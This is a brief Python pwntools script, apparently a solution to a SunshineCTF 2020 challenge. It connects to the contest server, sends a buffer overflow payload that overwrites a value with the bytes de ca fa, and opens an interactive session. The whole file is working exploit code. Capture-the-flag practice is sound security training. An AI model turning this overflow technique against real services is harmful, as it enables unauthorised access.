from pwn import *
# context.log_level = 'debug'
r = remote('chal.2020.sunshinectf.org', 30001)
#r = process('chall_01')
d = r.recv(1024)
r.sendline(b'aaaa')
r.sendline(b'b'*(0x60-0x8) + b'\xde\xca\xfa')
r.interactive()
r.close()
